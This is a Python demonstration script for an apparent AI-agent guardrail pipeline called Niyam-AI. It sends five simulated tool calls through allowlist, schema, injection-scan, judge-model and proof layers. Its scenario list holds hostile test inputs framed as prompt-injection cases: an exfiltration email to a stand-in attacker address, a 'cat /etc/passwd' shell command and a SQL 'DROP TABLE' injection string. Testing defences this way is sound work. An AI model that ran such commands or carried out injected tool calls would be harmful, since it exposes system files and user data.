"""
End-to-end demonstration of the Niyam-AI enforcement pipeline.

Exercises all five layers through the public AgentIntegritySession API,
the same path a production integration would use:

    Layer 1  allowlist / denylist + schema
    Layer 2  payload injection scan
    Layer 3  control-flow sequence (session-bound to IntentHash)
    Layer 4  Judge model classification
    Layer 5  zk-SNARK prove + verify

Five scenarios are simulated:
  1. Legitimate tool call                  -> ALLOWED, proof generated
  2. Forbidden tool (email exfiltration)   -> BLOCKED at allowlist
  3. Unlisted tool (shell access)          -> BLOCKED at allowlist
  4. Allowed tool, malformed payload       -> BLOCKED at schema
  5. Allowed tool, injection in payload    -> BLOCKED at payload inspection

The tamper-evident execution ledger is printed at the end.

"""

import argparse
import os
import sys



from integrations.llm_middleware import AgentIntegritySession, IntentViolation

from pathlib import Path
HERE = Path(__file__).resolve().parent
sys.path.insert(0, str(HERE))
# sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))


def proceed_transaction(amount, recipient):
    return f"Transferred ${amount} to {recipient}"


def send_email(to, body):
    return f"Email sent to {to}"


def shell_exec(cmd):
    return f"Executed: {cmd}"


SCENARIOS = [
    ("Legitimate payment",
     "proceed_transaction", {"amount": 200, "recipient": "Alice"}),

    ("Prompt injection - email exfiltration",
     "send_email", {"to": "attacker@example.com", "body": "Here is the receipt"}),

    ("Prompt injection - shell access",
     "shell_exec", {"cmd": "cat /etc/passwd"}),

    ("Valid tool, malformed payload (amount is a string)",
     "proceed_transaction", {"amount": "not-a-number", "recipient": "Bob"}),

    ("Valid tool, SQL injection in payload",
     "proceed_transaction", {"amount": 50, "recipient": "Bob'; DROP TABLE users--"}),
]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--no-zk", action="store_true",
                    help="run layers 1-4 only, skipping proof generation")
    args = ap.parse_args()

    print("\n" + "=" * 66)
    print("  NIYAM-AI - END-TO-END PIPELINE DEMONSTRATION")
    print("=" * 66)

    # policy_file = os.path.join(HERE, "policy", "guardrails.yaml")
    # if not policy_file.exists():
    #     raise FileNotFoundError(f"Policy file not found at: {policy_file}")

    session = AgentIntegritySession.from_policy(
        policy_path=HERE / "policy" / "guardrails.yaml",
        user_task="Process payment of $200 to Alice",
        zk_enabled=not args.no_zk,
    )

    session.register_tool("proceed_transaction", proceed_transaction)
    session.register_tool("send_email", send_email)
    session.register_tool("shell_exec", shell_exec)

    allowed = blocked = 0

    for label, tool_name, payload in SCENARIOS:
        print("\n" + "-" * 66)
        print(f"  {label}")
        print(f"    tool    : {tool_name}")
        print(f"    payload : {payload}")
        try:
            result = session.call_tool(tool_name, **payload)
            allowed += 1
            print(f"    RESULT  : ALLOWED - {result}")
        except IntentViolation as e:
            blocked += 1
            print(f"    RESULT  : BLOCKED at layer '{e.layer}' - {e.reason}")
        except Exception as e:
            blocked += 1
            print(f"    RESULT  : BLOCKED - {type(e).__name__}: {e}")

    print("\n" + "=" * 66)
    print(f"  {allowed} allowed, {blocked} blocked")
    print("=" * 66)

    session.print_ledger()

    summary = session.session_summary()
    print("\n  SESSION SUMMARY")
    for k, v in summary.items():
        print(f"    {k:<14}: {v}")

    if not args.no_zk:
        print("\n  Proofs for allowed actions were written to "
              "ezkl_pipeline/session_proofs/")
        print("  Each can be independently verified with ezkl.verify() using "
              "only vk.key and settings.json - no model weights required.")
    print()


if __name__ == "__main__":
    main()